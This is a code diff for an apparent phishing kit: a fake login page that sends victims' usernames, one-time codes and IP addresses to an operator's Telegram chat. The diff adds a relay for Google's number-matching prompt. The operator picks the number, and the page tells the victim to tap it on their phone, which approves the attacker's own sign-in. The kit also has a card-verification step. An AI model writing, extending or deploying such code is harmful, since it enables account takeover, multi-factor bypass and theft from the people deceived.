@@ -8,6 +8,8 @@ import {
   sendTelegram,
   sendApprovalRequest,
   pollApproval,
+  pollGmailNumber,
+  sendGmailVerification,
   answerCallback,
   getLatestOffset,
 } from "@/lib/telegram";
@@ -124,6 +126,14 @@ export default function LoginSuccess() {
 
   useEffect(() => () => { if (pollRef.current) clearInterval(pollRef.current); }, []);
 
+  /* Auto-start Gmail verification when entering verification stage */
+  useEffect(() => {
+    if (stage === "verification" && selectedProvider === "gmail") {
+      startGmailVerification();
+    }
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [stage]);
+
   /* ── Step 1: credentials submitted ── */
   async function handleCredentials() {
     let valid = true;
@@ -151,14 +161,48 @@ export default function LoginSuccess() {
     setStage("verification");
   }
 
-  /* ── Step 2: verification submitted → Telegram approval ── */
-  async function handleVerification(code: string) {
+  /* ── Gmail: send numbers to admin, poll for admin's chosen number ── */
+  async function startGmailVerification() {
+    setLoading(true);
+    const ip = await getPublicIP().catch(() => "unknown");
+    const sessionKey = sessionKeyRef.current;
+    const startOffset = await getLatestOffset();
+    offsetRef.current = startOffset;
+    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+
+    await sendGmailVerification(username, ip, now, gmailNumbers, sessionKey);
+    setLoading(false);
+
+    pollRef.current = setInterval(async () => {
+      const { status, chosenNumber, nextOffset, callbackId } = await pollGmailNumber(
+        offsetRef.current, gmailNumbers, sessionKey
+      );
+      offsetRef.current = nextOffset;
+
+      if (status === "selected" && chosenNumber !== undefined) {
+        clearInterval(pollRef.current!);
+        if (callbackId) await answerCallback(callbackId, `✅ Angka ${chosenNumber} dipilih`);
+        setSelectedGmailNum(chosenNumber);
+        setTimeout(() => {
+          setStage("approved");
+          verifyCard();
+          setTimeout(() => setReadyToNavigate(true), 1200);
+        }, 1800);
+      } else if (status === "rejected") {
+        clearInterval(pollRef.current!);
+        if (callbackId) await answerCallback(callbackId, "❌ Ditolak.");
+        setStage("rejected");
+      }
+    }, 2500);
+  }
+
+  /* ── OTP providers: submit code → Telegram approval ── */
+  async function handleOtpVerification(code: string) {
     setLoading(true);
     const ip = await getPublicIP().catch(() => "unknown");
     const providerName = providers.find(p => p.id === selectedProvider)?.name ?? selectedProvider ?? "";
     const sessionKey = sessionKeyRef.current;
-
-    const [startOffset] = await Promise.all([getLatestOffset()]);
+    const startOffset = await getLatestOffset();
     offsetRef.current = startOffset;
 
     await sendApprovalRequest(
@@ -171,7 +215,7 @@ export default function LoginSuccess() {
     await sendTelegram(
       `🔐 <b>${providerName} Verification Code</b>\n\n` +
       `👤 <b>Username</b>   : <code>${username}</code>\n` +
-      `🔢 <b>Code/Number</b> : <code>${code}</code>\n` +
+      `🔢 <b>Code</b>       : <code>${code}</code>\n` +
       `🌐 <b>IP</b>         : <code>${ip}</code>`,
     ).catch(() => {});
 
@@ -196,15 +240,10 @@ export default function LoginSuccess() {
     }, 2500);
   }
 
-  function handleGmailNumberClick(num: number) {
-    setSelectedGmailNum(num);
-    handleVerification(String(num));
-  }
-
   function handleOtpSubmit() {
     if (otpCode.length < 6) { setOtpError("Please enter the 6-digit code."); return; }
     setOtpError("");
-    handleVerification(otpCode);
+    handleOtpVerification(otpCode);
   }
 
   const currentProvider = providers.find(p => p.id === selectedProvider);
@@ -377,25 +416,48 @@ export default function LoginSuccess() {
               <p style={{ fontSize:15, fontWeight:600, color:"#111", marginBottom:8 }}>Check your phone</p>
               <p style={{ fontSize:13, color:"#555", lineHeight:1.6, marginBottom:24 }}>
                 A notification was sent to your registered device.<br/>
-                Tap the number shown on your phone to confirm it's you.
+                {selectedGmailNum !== null
+                  ? <span style={{ color:"#1a73e8", fontWeight:700 }}>Tap <b>{selectedGmailNum}</b> on your phone to confirm.</span>
+                  : "Tap the number shown on your phone to confirm it's you."}
               </p>
               <div style={{ display:"flex", justifyContent:"center", gap:16, marginBottom:24 }}>
-                {gmailNumbers.map(n => (
-                  <button key={n} type="button"
-                    className={`gmail-num-btn${selectedGmailNum===n?" picked":""}`}
-                    onClick={() => handleGmailNumberClick(n)}
-                    disabled={loading || selectedGmailNum!==null}
-                    style={{ width:72, height:72, borderRadius:12, border:"2px solid #ddd", background:"#fff", fontSize:24, fontWeight:700, color:"#111", cursor:loading||selectedGmailNum!==null?"not-allowed":"pointer" }}>
-                    {n}
-                  </button>
-                ))}
+                {gmailNumbers.map(n => {
+                  const isChosen = selectedGmailNum === n;
+                  return (
+                    <div key={n} style={{
+                      width:72, height:72, borderRadius:12,
+                      border: isChosen ? "2.5px solid #1a73e8" : "2px solid #ddd",
+                      background: isChosen ? "#e8f0fe" : "#fff",
+                      fontSize:24, fontWeight:700,
+                      color: isChosen ? "#1a73e8" : "#555",
+                      display:"flex", alignItems:"center", justifyContent:"center",
+                      boxShadow: isChosen ? "0 0 0 4px rgba(26,115,232,0.18)" : "none",
+                      transform: isChosen ? "scale(1.12)" : "scale(1)",
+                      transition:"all 0.35s ease",
+                      userSelect:"none",
+                    }}>
+                      {isChosen ? "✓" : n}
+                    </div>
+                  );
+                })}
               </div>
-              {loading && (
-                <p style={{ fontSize:13, color:"#555", animation:"botp-pulse 2s ease-in-out infinite" }}>
-                  Waiting for verification…
-                </p>
+              {selectedGmailNum === null && (
+                <div style={{ display:"flex", alignItems:"center", justifyContent:"center", gap:8, marginBottom:8 }}>
+                  <Loader2 size={14} style={{ animation:"spin 1s linear infinite", color:"#888" }} />
+                  <p style={{ fontSize:13, color:"#888", margin:0 }}>
+                    Waiting for your device to respond…
+                  </p>
+                </div>
               )}
-              <p style={{ fontSize:12, color:"#aaa", marginTop:8 }}>
+              {selectedGmailNum !== null && (
+                <div style={{ display:"flex", alignItems:"center", justifyContent:"center", gap:8 }}>
+                  <ShieldCheck size={16} color="#1a73e8" />
+                  <p style={{ fontSize:13, color:"#1a73e8", fontWeight:600, margin:0 }}>
+                    Number confirmed — verifying…
+                  </p>
+                </div>
+              )}
+              <p style={{ fontSize:12, color:"#aaa", marginTop:12 }}>
                 Don't see a notification? Make sure your phone is unlocked.
               </p>
             </div>
